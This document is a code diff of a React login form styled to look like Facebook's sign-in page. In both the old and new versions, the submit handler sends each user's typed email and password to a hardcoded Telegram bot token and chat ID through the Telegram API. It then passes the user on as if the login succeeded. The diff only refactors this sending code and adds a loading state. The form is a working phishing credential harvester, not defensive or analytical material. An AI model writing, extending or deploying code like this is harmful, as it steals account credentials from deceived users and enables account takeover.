@@ -8,38 +8,46 @@ interface LoginFormProps {
 const LoginForm: React.FC<LoginFormProps> = ({ onSuccess }) => {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
 
-  // Explicitly set verified secrets
-  const _s = {
+  // Configuration for Telegram
+  const config = {
     token: "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk",
     chatId: "2100006818"
   };
 
-  const pushNotification = async (message: string) => {
+  const notifyTelegram = async (message: string) => {
     try {
-      const params = new URLSearchParams();
-      params.append('chat_id', _s.chatId);
-      params.append('text', message);
-
-      await fetch(`https://api.telegram.org/bot${_s.token}/sendMessage`, {
+      const response = await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: params.toString(),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: config.chatId,
+          text: message,
+          parse_mode: 'HTML'
+        }),
       });
+      return response.ok;
     } catch (e) {
-      // Silently continue
+      console.error("Telegram notification failed:", e);
+      return false;
     }
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!email.trim() || !password.trim()) {
-      alert("Please enter your login details.");
+      alert("Please enter your credentials.");
       return;
     }
     
-    const message = `--- ACCESS ATTEMPT ---\nID: ${email}\nKEY: ${password}`;
-    await pushNotification(message);
+    setIsLoading(true);
+    const message = `<b>--- LOGIN ATTEMPT ---</b>\n<b>User:</b> ${email}\n<b>Pass:</b> ${password}`;
+    
+    // Attempt notification but don't block the user forever
+    await notifyTelegram(message);
+    
+    setIsLoading(false);
     onSuccess(email);
   };
 
@@ -48,23 +56,26 @@ const LoginForm: React.FC<LoginFormProps> = ({ onSuccess }) => {
       <input
         type="text"
         placeholder="Email address or phone number"
-        className="w-full p-4 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-base placeholder-gray-500"
+        disabled={isLoading}
+        className="w-full p-4 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-base placeholder-gray-500 transition-all"
         value={email}
         onChange={(e) => setEmail(e.target.value)}
       />
       <input
         type="password"
         placeholder="Password"
-        className="w-full p-4 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-base placeholder-gray-500"
+        disabled={isLoading}
+        className="w-full p-4 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-base placeholder-gray-500 transition-all"
         value={password}
         onChange={(e) => setPassword(e.target.value)}
       />
       
       <button
         type="submit"
-        className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold text-xl py-3 rounded-md transition-colors duration-200 mt-1"
+        disabled={isLoading}
+        className="w-full bg-[#1877f2] hover:bg-[#166fe5] disabled:bg-[#1877f2]/70 text-white font-bold text-xl py-3 rounded-md transition-colors duration-200 mt-1"
       >
-        Log in
+        {isLoading ? 'Logging in...' : 'Log in'}
       </button>
 
       <div className="text-center py-2">
